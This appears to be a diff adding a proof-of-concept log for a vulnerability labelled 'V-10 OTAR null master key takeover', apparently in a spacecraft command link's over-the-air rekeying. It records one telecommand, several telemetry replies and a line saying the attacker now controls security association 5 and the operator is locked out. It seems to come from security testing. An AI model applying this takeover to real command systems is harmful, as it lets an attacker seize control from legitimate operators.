@@ -1,0 +1,13 @@
+[   0.000] ========================================================================
+[   0.000] V-10 OTAR null master key takeover
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x15 via=usb AES  payload=011005
+[   0.000] <-- TM apid=0x15 clear len=6
+[   0.001] <-- TM apid=0x16 clear len=5
+[   0.001] OTAR ack: ok=1 master=0 sa=5
+[   0.002] <-- TM apid=0x09 AES len=14
+[   0.003] <-- TM apid=0x0C AES len=27
+[   0.003] => SA5 now trusts the attacker: operator locked out of his own secured APID, attacker writes with full authority
+[   0.003] ========================================================================
+[   0.003] POC OK
+[   0.003] ========================================================================
